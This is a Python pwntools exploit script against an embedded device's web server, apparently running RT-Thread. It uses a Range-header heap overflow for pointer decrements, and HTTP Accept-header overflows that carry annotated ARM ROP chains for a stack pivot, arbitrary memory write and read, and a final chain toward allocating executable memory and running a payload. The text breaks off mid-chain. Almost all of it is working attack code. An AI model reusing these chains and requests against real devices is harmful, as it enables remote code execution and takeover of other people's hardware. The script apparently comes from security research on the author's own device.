from pwn import *

# decrements pointer using heap overflow
def heap_overflow_arb_decrement_primitive(pointer, timeout):
    # Define the IP address and port
    info(f"Decrementing {hex(pointer)} via heap overflow")

    ip = b"192.168.169.1"
    port = 80

    # Define the filename with quotes
    filename = b"pwned"
    range_string = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5\xde\xad\xbe\xbeb7Ab8Ab9Ac0A" + p32(pointer)

    # Construct the raw HTTP GET request
    request = b"GET /mnt/" + filename + b" HTTP/1.1\r\n"
    request += b"Range: bytes=" + range_string + b"\r\n"

    info(f"Request length: {len(request)}")

    # Print the raw request for debugging
    info("Sending HTTP Request:")
    print(hexdump(request))

    # Create a socket and connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Set a timeout of 5 seconds
        s.settimeout(timeout)
        try:
            s.connect((ip, port))
            # Send the request
            s.sendall(request)

            # Receive the response
            response = b""
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk

        except socket.timeout:
            info(f"Decrement socket timed out after {timeout} second(s).")
        
        except Exception as e:
            info(f"An error occurred: {e}")

# this pivots to the larger buffer (which we fill with a less limited larger ROP chain, sent in subsequent requests)
def do_index_html_req_rop_stack_pivot_to_stage_2_rop_chain(method):
    # Define the IP address and port
    ip = b"192.168.169.1"
    port = 80

    # Construct the raw HTTP GET request
    request = method + b" /index.html HTTP/1.1\r\n"
    request += b"Accept-Aa0Aa"
    request += p32(0xc02b4edc) # pc

    # 0xc02b4edc | ldmia sp!,{r4,r5,r6,r7,r11,pc} <- pop stuff off of the stack so we actually get a decent bit of control
    request += p32(0xc05af011) # r4
    request += p32(0xc006b11c) # r5 <- change this to insert more gadgets
    request += p32(0xc04a28e0) # r6
    request += p32(0xc09ae8d4 - 0xdc) # r7 - where we write the stack pointer we destroy
    request += p32(0xdeadbeef) # r11
    request += p32(0xc0486988) # pc

    # | 0xc0486988 | c0486988 | blx r4 | c0486988 | blx r4  | <- go to thumb mode for the next gadget
    # | 0xc05af011 | c05af010 | add r0,sp,#0x20 | c05af012 | blx r6 |  <- move sp + 0x20 to r0 so we can save it for later
    # | 0xc04a28e0 | c04a28e0 | str r0,[r7,#0xdc] | c04a28e8 | blx r5 | <- save the r0 value into writable location

    ## need to fix up the callback we've modified, so just add 4 to it (this can probs be improved need better gadgets)
    # 0xc006b11c | ldmia sp!,{r4,pc}
    request += p32(0xc0218bd8) # r4
    request += p32(0xc0341af4) # pc

    # | 0xc0341af4 | c0341af4 | cpy r0,r4 | c0341af8  | ldmia sp!,{r4,r11,pc} | 
    request += p32(0xc05460e0) # r4
    request += p32(0xc09afebc + 0x510) # r11
    request += p32(0xc04092b0) # pc

    # | 0xc04092b0 | c04092b0 | str r0,[r11,#-0x510] | c04092b4 | blx r4 | 

    ## need to fix up the client count thing (0xc09b10ec to 0, 0xC09B1184 to 0, 0xC09B121C to 0, C09B12B4 to 0)
    # | 0xc05460e0 | c05460e0 | mov r0,#0x0 | c05460e4 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc0237e44) # r4
    request += p32(0xC09B1184 - 0xc) # r5
    request += p32(0xc09b10ec + 0x510) # r11
    request += p32(0xc04092b0) # pc

    # | 0xc04092b0 | c04092b0 | str r0,[r11,#-0x510] | c04092b4  | blx r4 |

    # | 0xc0237e44 | c0237e44 | str r0,[r5,#0xc] | c0237e48 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc0237e44) # r4
    request += p32(0xC09B12B4 - 0xc) # r5
    request += p32(0xC09B121C + 0x510) # r11
    request += p32(0xc04092b0) # pc

    # | 0xc04092b0 | c04092b0 | str r0,[r11,#-0x510] | c04092b4  | blx r4 | 

    ## Now we need to stack pivot

    # | 0xc0237e44 | c0237e44 | str r0,[r5,#0xc] | c0237e48 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc09ae8d4) # r4 <- address of our stored stack pointer
    request += p32(0xdeadbeef) # r5
    request += p32(0xdeadbeef) # r11
    request += p32(0xc01fefbc) # pc

    # | 0xc01fefbc | c01fefbc | ldr r0,[r4,#0x0] | c01fefc0 | ldmia sp!,{r4,r5,r6,r7,r11,pc} | 
    request += p32(0xdeadbeef) # r4
    #### 0xc091bba0 (0x100) goes to one of the decrements???
    #### 0xc091ac78 (0x110) goes further
    request += p32(0xc08e6de0 - 0x30) # r5 <- pointer to amount to sub from loaded stack pointer
    request += p32(0xc046a980) # r6 <- change for add (0xc046a980) or sub (0xc01133bc)
    request += p32(0xdeadbeef) # r7
    request += p32(0xdeadbeef) # r11
    request += p32(0xc0570e14) # pc

    # need to decrement r0 (or increment idk)

    # | 0xc0570e14 | c0570e14 | ldr r4,[r5,#0x30] | c0570e18 | blx r6 | 

    # | 0xc046a980 | c046a980 | add r0,r0,r4 | c046a984  | ldmia sp!,{r4,r5,r11,pc} | 

    # | 0xc01133bc | c01133bc | sub r0,r0,r4 | c01133c0  | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xdeadbeef) # r4
    request += p32(0xdeadbeef) # r5
    request += p32(0xdeadbeef) # r11
    request += p32(0xc01bbd80) # pc

    # | 0xc01bbd80  | ldmia sp!,{r4,r5,r6,r7,r8,r9,r11,pc} | 
    request += p32(0xc021ff38) # r4 <- we get this gadget to set the sp from our r11 and load registers from our new stack
    request += p32(0xdeadbeef) # r5
    request += p32(0xc05c49d9) # r6 <- this is a thumb mode gadget
    request += p32(0xc09afec0) # r7 <- this MUSt be this address (it is the address of a mutex we unlock)
    request += p32(0xc03b2c40) # r8
    request += p32(0xdeadbeef) # r9
    request += p32(0xdeadbeef) # r11
    request += p32(0xc03f4b90) # pc

    # | 0xc03f4b90 | c03f4b90 | cpy r10,r0 | c03f4b98  | blx r8 | 
    # | 0xc03b2c40 | c03b2c40 | mov r8,#0x0 | c03b2c44 | blx r6 |
    # | 0xc05c49d8 | c05c49d8 | add.w r11,r10,r8 | c05c49e0  | blx r4  | <- clobbers r1/2, thumb as well probs, but sets the r11 to something we control

    # max request size for rop payload is 283 (so if request length is over this ur cooked)
    
    info(f"Request length: {len(request)}")

    # Print the raw request for debugging
    info("Sending HTTP request for first ROP chain on stack:")
    print(hexdump(request))

    # Create a socket and connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Set a timeout of 5 seconds
        try:
            s.connect((ip, port))
            # Send the request
            s.sendall(request)

            # # Receive the response
            info(s.recv(4096).decode('utf-8'))
       
        except Exception as e:
            info(f"An error occurred: {e}")

# this is a rop chain for a memory write, where the address is in the
#  'language' param, and the value is in the 'encodec' param
def do_index_html_req_rop_memory_write(method):
    # Define the IP address and port
    ip = b"192.168.169.1"
    port = 80

    # Construct the raw HTTP GET request
    request = method + b" /index.html HTTP/1.1\r\n"
    request += b"Accept-bbbba"
    request += p32(0xc02b4edc) # pc

    # 0xc02b4edc | ldmia sp!,{r4,r5,r6,r7,r11,pc} <- pop stuff off of the stack so we actually get a decent bit of control
    request += p32(0xc05af011) # r4
    request += p32(0xc006b11c) # r5 <- change this to insert more gadgets
    request += p32(0xc04a28e0) # r6
    request += p32(0xc09ae8d4 - 0xdc) # r7 - where we write the stack pointer we destroy
    request += p32(0xdeadbeef) # r11
    request += p32(0xc0486988) # pc

    # | 0xc0486988 | c0486988 | blx r4 | c0486988 | blx r4  | <- go to thumb mode for the next gadget
    # | 0xc05af011 | c05af010 | add r0,sp,#0x20 | c05af012 | blx r6 |  <- move sp + 0x20 to r0 so we can save it for later
    # | 0xc04a28e0 | c04a28e0 | str r0,[r7,#0xdc] | c04a28e8 | blx r5 | <- save the r0 value into writable location

    ## need to fix up the callback we've modified, so just add 4 to it (this can probs be improved need better gadgets)
    # 0xc006b11c | ldmia sp!,{r4,pc}
    request += p32(0xc0218bd8) # r4
    request += p32(0xc0341af4) # pc

    # | 0xc0341af4 | c0341af4 | cpy r0,r4 | c0341af8  | ldmia sp!,{r4,r11,pc} | 
    request += p32(0xc05460e0) # r4
    request += p32(0xc09afebc + 0x510) # r11
    request += p32(0xc04092b0) # pc

    # | 0xc04092b0 | c04092b0 | str r0,[r11,#-0x510] | c04092b4 | blx r4 | 

    ## need to fix up the client count thing (0xc09b10ec to 0, 0xC09B1184 to 0, 0xC09B121C to 0, C09B12B4 to 0)
    # | 0xc05460e0 | c05460e0 | mov r0,#0x0 | c05460e4 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc0237e44) # r4
    request += p32(0xC09B1184 - 0xc) # r5
    request += p32(0xc09b10ec + 0x510) # r11
    request += p32(0xc04092b0) # pc

    # | 0xc04092b0 | c04092b0 | str r0,[r11,#-0x510] | c04092b4  | blx r4 |

    # | 0xc0237e44 | c0237e44 | str r0,[r5,#0xc] | c0237e48 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc0237e44) # r4
    request += p32(0xC09B12B4 - 0xc) # r5
    request += p32(0xC09B121C + 0x510) # r11
    request += p32(0xc04092b0) # pc

    # | 0xc04092b0 | c04092b0 | str r0,[r11,#-0x510] | c04092b4  | blx r4 | 

    # | 0xc0237e44 | c0237e44 | str r0,[r5,#0xc] | c0237e48 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc09afa54 - 0x1c) # r4 <- pointer to encodec config struct
    request += p32(0xdeadbeef) # r5 
    request += p32(0xdeadbeef) # r11
    request += p32(0xc058874c) # pc

    # load pointer at language param into r5
    # | 0xc058874c | c058874c | ldr r0,[r4,#0x1c] | c0588750 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc0069468) # r4
    request += p32(0xdeadbeef) # r5
    request += p32(0xdeadbeef) # r11
    request += p32(0xc0117ad4) # pc

    # | 0xc0117ad4 | c0117ad4 | ldr r0,[r0,#0x14] | c0117ad8 | ldmia sp!,{r11,pc} |
    request += p32(0xdeadbeef) # r11
    request += p32(0xc058f124) # pc

    # | 0xc058f124 | c058f124 | cpy r6,r0 | c058f130  | blx r4 | 

    # | 0xc0069468 | ldmia sp!, {r4,pc} |
    request += p32(0xc09afa30 - 0x1c) # r4 <- language config struct pointer in memory
    request += p32(0xc058874c) # pc

    ## now load value at encodec param into some other register lol
    # | 0xc058874c | c058874c | ldr r0,[r4,#0x1c] | c0588750 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc003c2b8) # r4
    request += p32(0xdeadbeef) # r5
    request += p32(0xdeadbeef) # r11
    request += p32(0xc0117ad4) # pc

    # | 0xc0117ad4 | c0117ad4 | ldr r0,[r0,#0x14] | c0117ad8 | ldmia sp!,{r11,pc} |
    request += p32(0xdeadbeef) # r11
    request += p32(0xc03a33f4) # pc

    # | 0xc03a33f4 | c03a33f4 | cpy r5,r0 | c03a33f8 | blx r4 | 

    # | 0xc003c2b8 | c003c2b8 | str r5,[r6,#0x0] | c003c2bc | ldmia sp!,{r4,r5,r6,r7,r8,pc} |
    request += p32(0xc006bac0) # r4
    request += p32(0xc09ae8d4 - 0x4) # r5
    request += p32(0xc04460f0) # r6
    request += p32(0xc03d444c) # r7
    request += p32(0xc006aa74 - 1) # r8 (-1 to account for later clobber)
    request += p32(0xc0533030) # pc

    ## now fix up the stack ting, need to get stack pointer before the big proc buffers, then jump to end of function to pop them, then win

    # | 0xc0533030 | c0533030 | cpy r3,r5 | c0533034 | blx r6 | 
    # | 0xc04460f0 | c04460f0 | ldr r6,[r3,#0x4] | c04460f4 | blx r7 | 
    # | 0xc03d444c | c03d444c | cpy r7,r6 | c03d4460 | blx r4 | <- so we can clobber lower registers and keep r7 safe, clobbers r6, r1, r0, r8 (should be fine here)

    # 0xc006bac0: ldmia sp!,{r4,r5,r6,pc} 
    request += p32(0xc06f06e8 - 4) # r4 <- where we load offset we add from - 4
    request += p32(0xdeadbeef) # r5
    request += p32(0xc050c2a0) # r6
    request += p32(0xc013d628) # pc

    # | 0xc013d628 | 0xc013d628 | ldr r1,[r4,#0x4] | 0xc013d62c | blx r6 |
    # | 0xc050c2a0 | c050c2a0 | add r1,r7,r1 | c050c2a4  | blx r8 |  <- could work? Need to pre populate r8 earlier on (and account for clobbering)

    #  0xc006aa74 : ldmia sp!,{r4,r5,r6,r7,r8,pc}
    request += p32(0xc02202e4) # r4 <- we resume normal control here to 0xc021ff38 (because we should have now reset the stack pointer properly)
    request += p32(0xdeadbeef) # r5
    request += p32(0xc05c49d9) # r6 <- this is a thumb mode gadget
    request += p32(0xc09afec0) # r7
    request += p32(0xc03b2c40) # r8
    request += p32(0xc0533910) # pc

    # | 0xc0533910 | c0533910 | cpy r10,r1  | c0533914  | blx r8 | 
    # | 0xc03b2c40 | c03b2c40 | mov r8,#0x0 | c03b2c44 | blx r6 |
    # | 0xc05c49d8 | c05c49d8 | add.w r11,r10,r8 | c05c49e0  | blx r4  | <- clobbers r1/2, thumb as well probs, but sets the r11 to something we control

    info(f"Request length: {len(request)}")

    # Print the raw request for debugging
    info("Raw HTTP Request:")
    print(hexdump(request))

    # Create a socket and connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Set a timeout of 5 seconds
        try:
            s.connect((ip, port))
            # Send the request
            s.sendall(request)

            # # Receive the response
            info(s.recv(4096).decode('utf-8'))
       
        except Exception as e:
            info(f"An error occurred: {e}")

# this is pretty much the exact same as the other write, but the client count locations are different
def do_index_html_req_rop_memory_write_safe(method):
    # Define the IP address and port
    ip = b"192.168.169.1"
    port = 80

    # Construct the raw HTTP GET request
    request = method + b" /index.html HTTP/1.1\r\n"
    request += b"Accept-bbbba"
    request += p32(0xc02b4edc) # pc

    # 0xc02b4edc | ldmia sp!,{r4,r5,r6,r7,r11,pc} <- pop stuff off of the stack so we actually get a decent bit of control
    request += p32(0xc05af011) # r4
    request += p32(0xc006b11c) # r5 <- change this to insert more gadgets
    request += p32(0xc04a28e0) # r6
    request += p32(0xc09ae8d4 - 0xdc) # r7 - where we write the stack pointer we destroy
    request += p32(0xdeadbeef) # r11
    request += p32(0xc0486988) # pc

    # | 0xc0486988 | c0486988 | blx r4 | c0486988 | blx r4  | <- go to thumb mode for the next gadget
    # | 0xc05af011 | c05af010 | add r0,sp,#0x20 | c05af012 | blx r6 |  <- move sp + 0x20 to r0 so we can save it for later
    # | 0xc04a28e0 | c04a28e0 | str r0,[r7,#0xdc] | c04a28e8 | blx r5 | <- save the r0 value into writable location

    ## need to fix up the callback we've modified, so just add 4 to it (this can probs be improved need better gadgets)
    # 0xc006b11c | ldmia sp!,{r4,pc}
    request += p32(0xc0218bd8) # r4
    request += p32(0xc0341af4) # pc

    # | 0xc0341af4 | c0341af4 | cpy r0,r4 | c0341af8  | ldmia sp!,{r4,r11,pc} | 
    request += p32(0xc05460e0) # r4
    request += p32(0xc09afebc + 0x510) # r11
    request += p32(0xc04092b0) # pc

    # | 0xc04092b0 | c04092b0 | str r0,[r11,#-0x510] | c04092b4 | blx r4 | 

    ## need to fix up the client count thing (0xc09b10ec to 0, 0xC09B1184 to 0, 0xC09B121C to 0, C09B12B4 to 0)
    # | 0xc05460e0 | c05460e0 | mov r0,#0x0 | c05460e4 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc0237e44) # r4
    request += p32(0xc09b121c - 0xc) # r5
    request += p32(0xC09B1184 + 0x510) # r11
    request += p32(0xc04092b0) # pc

    # | 0xc04092b0 | c04092b0 | str r0,[r11,#-0x510] | c04092b4  | blx r4 |

    # | 0xc0237e44 | c0237e44 | str r0,[r5,#0xc] | c0237e48 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc0237e44) # r4
    request += p32(0xc09b134c - 0xc) # r5
    request += p32(0xc09b12b4 + 0x510) # r11
    request += p32(0xc04092b0) # pc

    # | 0xc04092b0 | c04092b0 | str r0,[r11,#-0x510] | c04092b4  | blx r4 | 

    # | 0xc0237e44 | c0237e44 | str r0,[r5,#0xc] | c0237e48 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc09afa54 - 0x1c) # r4 <- pointer to encodec config struct
    request += p32(0xdeadbeef) # r5 
    request += p32(0xdeadbeef) # r11
    request += p32(0xc058874c) # pc

    # load pointer at language param into r5
    # | 0xc058874c | c058874c | ldr r0,[r4,#0x1c] | c0588750 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc0069468) # r4
    request += p32(0xdeadbeef) # r5
    request += p32(0xdeadbeef) # r11
    request += p32(0xc0117ad4) # pc

    # | 0xc0117ad4 | c0117ad4 | ldr r0,[r0,#0x14] | c0117ad8 | ldmia sp!,{r11,pc} |
    request += p32(0xdeadbeef) # r11
    request += p32(0xc058f124) # pc

    # | 0xc058f124 | c058f124 | cpy r6,r0 | c058f130  | blx r4 | 

    # | 0xc0069468 | ldmia sp!, {r4,pc} |
    request += p32(0xc09afa30 - 0x1c) # r4 <- language config struct pointer in memory
    request += p32(0xc058874c) # pc

    ## now load value at encodec param into some other register lol
    # | 0xc058874c | c058874c | ldr r0,[r4,#0x1c] | c0588750 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc003c2b8) # r4
    request += p32(0xdeadbeef) # r5
    request += p32(0xdeadbeef) # r11
    request += p32(0xc0117ad4) # pc

    # | 0xc0117ad4 | c0117ad4 | ldr r0,[r0,#0x14] | c0117ad8 | ldmia sp!,{r11,pc} |
    request += p32(0xdeadbeef) # r11
    request += p32(0xc03a33f4) # pc

    # | 0xc03a33f4 | c03a33f4 | cpy r5,r0 | c03a33f8 | blx r4 | 

    # | 0xc003c2b8 | c003c2b8 | str r5,[r6,#0x0] | c003c2bc | ldmia sp!,{r4,r5,r6,r7,r8,pc} |
    request += p32(0xc006bac0) # r4
    request += p32(0xc09ae8d4 - 0x4) # r5
    request += p32(0xc04460f0) # r6
    request += p32(0xc03d444c) # r7
    request += p32(0xc006aa74 - 1) # r8 (-1 to account for later clobber)
    request += p32(0xc0533030) # pc

    ## now fix up the stack ting, need to get stack pointer before the big proc buffers, then jump to end of function to pop them, then win

    # | 0xc0533030 | c0533030 | cpy r3,r5 | c0533034 | blx r6 | 
    # | 0xc04460f0 | c04460f0 | ldr r6,[r3,#0x4] | c04460f4 | blx r7 | 
    # | 0xc03d444c | c03d444c | cpy r7,r6 | c03d4460 | blx r4 | <- so we can clobber lower registers and keep r7 safe, clobbers r6, r1, r0, r8 (should be fine here)

    # 0xc006bac0: ldmia sp!,{r4,r5,r6,pc} 
    request += p32(0xc06f06e8 - 4) # r4 <- where we load offset we add from - 4
    request += p32(0xdeadbeef) # r5
    request += p32(0xc050c2a0) # r6
    request += p32(0xc013d628) # pc

    # | 0xc013d628 | 0xc013d628 | ldr r1,[r4,#0x4] | 0xc013d62c | blx r6 |
    # | 0xc050c2a0 | c050c2a0 | add r1,r7,r1 | c050c2a4  | blx r8 |  <- could work? Need to pre populate r8 earlier on (and account for clobbering)

    #  0xc006aa74 : ldmia sp!,{r4,r5,r6,r7,r8,pc}
    request += p32(0xc02202e4) # r4 <- we resume normal control here to 0xc021ff38 (because we should have now reset the stack pointer properly)
    request += p32(0xdeadbeef) # r5
    request += p32(0xc05c49d9) # r6 <- this is a thumb mode gadget
    request += p32(0xc09afec0) # r7
    request += p32(0xc03b2c40) # r8
    request += p32(0xc0533910) # pc

    # | 0xc0533910 | c0533910 | cpy r10,r1  | c0533914  | blx r8 | 
    # | 0xc03b2c40 | c03b2c40 | mov r8,#0x0 | c03b2c44 | blx r6 |
    # | 0xc05c49d8 | c05c49d8 | add.w r11,r10,r8 | c05c49e0  | blx r4  | <- clobbers r1/2, thumb as well probs, but sets the r11 to something we control

    info(f"Request length: {len(request)}")

    # Print the raw request for debugging
    info("Raw HTTP Request:")
    print(hexdump(request))

    # Create a socket and connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Set a timeout of 5 seconds
        try:
            s.connect((ip, port))
            # Send the request
            s.sendall(request)

            # # Receive the response
            info(s.recv(4096).decode('utf-8'))
       
        except Exception as e:
            info(f"An error occurred: {e}")

# this is a rop chain for a memory read, where the address is in the
#  'encodec' param, and the value is loaded back into the 'encodec' param
def do_index_html_req_rop_memory_read(method):
    # Define the IP address and port
    ip = b"192.168.169.1"
    port = 80

    # Construct the raw HTTP GET request
    request = method + b" /index.html HTTP/1.1\r\n"
    request += b"Accept-Aa0Aa"
    request += p32(0xc02b4edc) # pc

    # 0xc02b4edc | ldmia sp!,{r4,r5,r6,r7,r11,pc} <- pop stuff off of the stack so we actually get a decent bit of control
    request += p32(0xc05af011) # r4
    request += p32(0xc006b11c) # r5 <- change this to insert more gadgets
    request += p32(0xc04a28e0) # r6
    request += p32(0xc09ae8d4 - 0xdc) # r7 - where we write the stack pointer we destroy
    request += p32(0xdeadbeef) # r11
    request += p32(0xc0486988) # pc

    # | 0xc0486988 | c0486988 | blx r4 | c0486988 | blx r4  | <- go to thumb mode for the next gadget
    # | 0xc05af011 | c05af010 | add r0,sp,#0x20 | c05af012 | blx r6 |  <- move sp + 0x20 to r0 so we can save it for later
    # | 0xc04a28e0 | c04a28e0 | str r0,[r7,#0xdc] | c04a28e8 | blx r5 | <- save the r0 value into writable location

    ## need to fix up the callback we've modified, so just add 4 to it (this can probs be improved need better gadgets)
    # 0xc006b11c | ldmia sp!,{r4,pc}
    request += p32(0xc0218bd8) # r4
    request += p32(0xc0341af4) # pc

    # | 0xc0341af4 | c0341af4 | cpy r0,r4 | c0341af8  | ldmia sp!,{r4,r11,pc} | 
    request += p32(0xc05460e0) # r4
    request += p32(0xc09afebc + 0x510) # r11
    request += p32(0xc04092b0) # pc

    # | 0xc04092b0 | c04092b0 | str r0,[r11,#-0x510] | c04092b4 | blx r4 | 

    ## need to fix up the client count thing (0xc09b10ec to 0, 0xC09B1184 to 0, 0xC09B121C to 0, C09B12B4 to 0)
    # | 0xc05460e0 | c05460e0 | mov r0,#0x0 | c05460e4 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc0237e44) # r4
    request += p32(0xC09B1184 - 0xc) # r5
    request += p32(0xc09b10ec + 0x510) # r11
    request += p32(0xc04092b0) # pc

    # | 0xc04092b0 | c04092b0 | str r0,[r11,#-0x510] | c04092b4  | blx r4 |

    # | 0xc0237e44 | c0237e44 | str r0,[r5,#0xc] | c0237e48 | ldmia sp!,{r4,r5,r11,pc} | 
    request += p32(0xc004e374) # r4
    request += p32(0xC09B12B4 - 0xd6c) # r5
    request += p32(0xC09B121C + 0x510) # r11
    request += p32(0xc04092b0) # pc

    # | 0xc04092b0 | c04092b0 | str r0,[r11,#-0x510] | c04092b4  | blx r4 | 

    # | 0xc004e374 | c004e374 | str r0,[r5,#0xd6c] | c004e378  | ldmia sp!,{r4,r5,r6,r7,r8,pc} | 
    request += p32(0xc09afa54 - 0x24) # r4 <- pointer to encodec config struct
    request += p32(0xc0572494) # r5
    request += p32(0xc0032894) # r6
    request += p32(0xdeadbeef) # r7
    request += p32(0xc0117ad4) # r8 
    request += p32(0xc010dc94) # pc

    # load pointer at encodec param into r2
    # | 0xc010dc94 | c010dc94 | ldr r0,[r4,#0x24] | c010dc98  | blx r8 | 

    # get the value stored in the encodec config entry struct
    # | 0xc0117ad4 | c0117ad4 | ldr r0,[r0,#0x14] | c0117ad8 | ldmia sp!,{r11,pc} |
    request += p32(0xdeadbeef) # r11
    request += p32(0xc0586b48) # pc

    # r0 contains the pointer we want to read
    # | 0xc0586b48 | c0586b48 | cpy r4,r0 | c0586b50 | blx r5 | 

    # after this r3 contains the value we want to save to the language pointer (we pre-asjusted address to account for offset)
    # | 0xc0572494 | c0572494 | ldr r3,[r4,#0x4] | c057249c  | blx r6 | 

    # | 0xc0032894 | c0032894 | ldmia sp!,{r4,r5,pc} |
    request += p32(0xc09afa54) # r4 <- pointer to language config struct where we save
    request += p32(0xc0160358) # r5
    request += p32(0xc035ad94) # pc

    # | 0xc035ad94 | c035ad94 | ldr r0,[r4,#0x0] | c035ad9c | blx r5 | 

    # | 0xc0160358 | c0160358 | str r3,[r0,#0x14]| c016035c | ldmia sp!,{r11,pc}| 
    request += p32(0xdeadbeef) # r11
    request += p32(0xc003c2bc) # pc

    # | 0xc003c2bc | c003c2bc | ldmia sp!,{r4,r5,r6,r7,r8,pc} |
    request += p32(0xc006bac0) # r4
    request += p32(0xc09ae8d4 - 0x4) # r5
    request += p32(0xc04460f0) # r6
    request += p32(0xc03d444c) # r7
    request += p32(0xc006aa74 - 1) # r8 (-1 to account for later clobber)
    request += p32(0xc0533030) # pc

    ## now fix up the stack ting, need to get stack pointer before the big proc buffers, then jump to end of function to pop them, then win

    # | 0xc0533030 | c0533030 | cpy r3,r5 | c0533034 | blx r6 | 
    # | 0xc04460f0 | c04460f0 | ldr r6,[r3,#0x4] | c04460f4 | blx r7 | 
    # | 0xc03d444c | c03d444c | cpy r7,r6 | c03d4460 | blx r4 | <- so we can clobber lower registers and keep r7 safe, clobbers r6, r1, r0, r8 (should be fine here)

    # 0xc006bac0: ldmia sp!,{r4,r5,r6,pc} 
    request += p32(0xc06f06e8 - 4) # r4 <- where we load offset we add from - 4
    request += p32(0xdeadbeef) # r5
    request += p32(0xc050c2a0) # r6
    request += p32(0xc013d628) # pc

    # | 0xc013d628 | 0xc013d628 | ldr r1,[r4,#0x4] | 0xc013d62c | blx r6 |
    # | 0xc050c2a0 | c050c2a0 | add r1,r7,r1 | c050c2a4  | blx r8 |  <- could work? Need to pre populate r8 earlier on (and account for clobbering)

    #  0xc006aa74 : ldmia sp!,{r4,r5,r6,r7,r8,pc}
    request += p32(0xc02202e4) # r4 <- we resume normal control here to 0xc021ff38 (because we should have now reset the stack pointer properly)
    request += p32(0xdeadbeef) # r5
    request += p32(0xc05c49d9) # r6 <- this is a thumb mode gadget
    request += p32(0xc09afec0) # r7
    request += p32(0xc03b2c40) # r8
    request += p32(0xc0533910) # pc

    # | 0xc0533910 | c0533910 | cpy r10,r1  | c0533914  | blx r8 | 
    # | 0xc03b2c40 | c03b2c40 | mov r8,#0x0 | c03b2c44 | blx r6 |
    # | 0xc05c49d8 | c05c49d8 | add.w r11,r10,r8 | c05c49e0  | blx r4  | <- clobbers r1/2, thumb as well probs, but sets the r11 to something we control

    info(f"Request length: {len(request)}")

    # Print the raw request for debugging
    info("Raw HTTP Request:")
    print(hexdump(request))

    # Create a socket and connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Set a timeout of 5 seconds
        try:
            s.connect((ip, port))
            # Send the request
            s.sendall(request)

            # # Receive the response
            info(s.recv(4096).decode('utf-8'))
       
        except Exception as e:
            info(f"An error occurred: {e}")

# mallocs a buffer, loads contents of test.aac, jumps to it
def do_index_html_req_for_code_exec(method, payload_length):
    # this ROP chain will first malloc a buffer (could put the size in language or something?)
    # then it will call `rt_hw_mmu_change_attr`
    # - param 1 is the address of the malloc'd buffer
    # - param 2 is the address of the malloc'd buffer - 0x80000000
    # - param 3 is the size of the malloc'd buffer
    # - param 4 is 0b0000110010000001 / 0xc81 / 3201

    # it will then somehow populate it - load from a file maybe, or a socket?
    # then we spin up a thread that runs the ting

    rop_chain = p32(0xc03edf14) # pc

    ## do the initial malloc and save it somewhere (0x110 at the moment)

    # | 0xc03edf14 | ldmia sp!,{r4,r5,r6,r7,r8,r9,r11,pc} |
    rop_chain += p32(0xc00a5a90) # r4
    rop_chain += p32(0xc01a724c) # r5 <- function to call here (rt_malloc_align)
    rop_chain += p32(0x00002000) # r6 <- size of allocation
    rop_chain += p32(0x00001000) # r7 <- alignment value
    rop_chain += p32(0xc0473224) # r8
    rop_chain += p32(0xc0450540) # r9
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc0588e9c) # pc

    # | 0xc0588e9c | c0588e9c | mov r0,#0x0 | c0588ea0  | ldmia sp!,{r11,pc} | 
    rop_chain += p32(0x00000000) # r11
    rop_chain += p32(0xc009c29c) # pc

    # | 0xc009c29c | c009c29c | cpy r1,r7 | c009c2a0  | blx r4 | 

    # | 0xc00a5a90 | c00a5a90 | cpy r0,r6 | c00a5a94 | blx r9 |

    # | 0xc0450540 | c0450540 | cpy r3,r5 | c0450544 | blx r8 | 
    
    # | 0xc0473224 | blx r3 | c0473228 | ldmia sp!,{r3,r4,r5,r6,r7,r8,r9,r10,r11,pc} | <- does the function call
    rop_chain += p32(0xc04fe360) # r3
    rop_chain += p32(0xc00d2838) # r4
    rop_chain += p32(0x00000000) # r5
    rop_chain += p32(0x80000000) # r6 <- subtract from our buffer to get physical memory
    rop_chain += p32(0xc0024820) # r7
    rop_chain += p32(0xc008f514) # r8 
    rop_chain += p32(0xc019ca6c) # r9 <- address of `rt_hw_mmu_change_attr`
    rop_chain += p32(0x00002000) # r10 <- this is the size argument of the change attr function
    rop_chain += p32(0xc08e4ee0 + 0x40) # r11 <- we back up the address of malloc'd buffer here
    rop_chain += p32(0xc0420f80) # pc

    ## now we call rt_hw_mmu_change_attr (r0 is our buffer address)

    # | 0xc0420f80 | c0420f80 | cpy r5,r0 | c0420f84  | blx r3 | 

    # | 0xc04fe360 | c04fe360 | cpy r1,r5 | c04fe364  | blx r4 | 

    # | 0xc00d2838 | c00d2838 | sub r1,r1,r6 | c00d283c  | blx r8 | 

    # | 0xc008f514 | cpy r2,r10 | c008f518 | blx r7 | 

    # store the malloc result somewhere safe if we need it again
    # | 0xc0024820 | ldmia sp!,{r4,pc} |
    rop_chain += p32(0xc0583f54) # r4
    rop_chain += p32(0xc0485d38) # pc

    # | 0xc0485d38 | c0485d38 | str r0,[r11,#-0x40] | c0485d3c  | blx r4 | 

    # | 0xc0583f54 | ldmia sp!,{r4,r5,r6,r11,pc} | 
    rop_chain += p32(0xc03edf0c) # r4
